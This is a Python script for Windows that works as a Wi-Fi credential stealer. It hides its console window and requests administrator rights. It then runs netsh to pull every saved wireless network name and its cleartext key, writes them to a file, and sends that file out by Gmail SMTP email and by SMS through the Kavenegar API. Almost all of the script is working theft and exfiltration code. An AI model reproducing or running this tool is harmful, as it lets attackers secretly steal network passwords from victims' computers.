import subprocess
# For sms
from kavenegar import *
# For email
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
import smtplib
# For hiding
import ctypes
# For admin access
import os
import sys
import win32com.shell.shell as shell

# Hide terminal
kernel = ctypes.WinDLL('kernel32')

user = ctypes.WinDLL('user32')

SW_HIDE = 0

hWnd = kernel.GetConsoleWindow()
user.ShowWindow(hWnd, SW_HIDE)

# Admin access
ASADMIN = 'asadmin'
try:
    if sys.argv[-1] != ASADMIN:
        script = os.path.abspath(sys.argv[0])
        params = ' '.join([script] + sys.argv[1:] + [ASADMIN])
        shell.ShellExecuteEx(lpVerb='runas', lpFile=sys.executable, lpParameters=params)
except:
    pass

# Opening a file for saving wifi names and passwords
file_obj = open("wifi.txt", "w")

# Getting wifi names
command = 'netsh wlan show profiles'
r1 = subprocess.run(command,shell=True,stdout=subprocess.PIPE)
output = r1.stdout.decode("utf-8")
o1 = output.split('All User Profile     :')

# Counting wifi names
length = len(o1)

# Getting wifi password for each wifi and writing them in file
for count in range(1,length):
    no = o1[count].strip()
    print(no)

    command2 = 'netsh wlan show profile name={} key=clear | findstr Key'.format(no)

    r2 = subprocess.run(command2,shell=True,stdout=subprocess.PIPE)
    output2 = r2.stdout.decode("utf-8").strip()
    o2 = output2[24:].strip()
    print(o2)
    file_obj.write('Name : '+o1[count]+'Key : '+o2+'\n'+'\n')

# Closing file
file_obj.close()

# Sending email
file = open("wifi.txt","r")
# Create message object instance
msg = MIMEMultipart()
message = file.read()
# Setup the parameters of the message
password = '' # Sender email password
msg['From'] = '' # Sender email
msg['To'] = '' # Receiver email
msg['Subject'] = '' # Subject of Email
# Add in the message body
msg.attach(MIMEText(message, 'plain'))
# Create server
server = smtplib.SMTP('smtp.gmail.com: 587')
server.starttls()
# Login Credentials for sending the mail
server.login(msg['From'], password)
# Send the message via the server.
server.sendmail(msg['From'], msg['To'], msg.as_string())
server.quit()
print("successfully sent email !")

# Sending sms with Kavenegar
file = open("wifi.txt","r")
try:
    api = KavenegarAPI("     Your api !     ") 
    params = {
        'sender': '',
        'receptor': '', # Sms receiver number 
        'message': file.read() ,
    } 
    response = api.sms_send(params)
except APIException as e: 
    print(e)
except HTTPException as e: 
    print(e)

# Finish!
print('finish !')

sys.exit(0)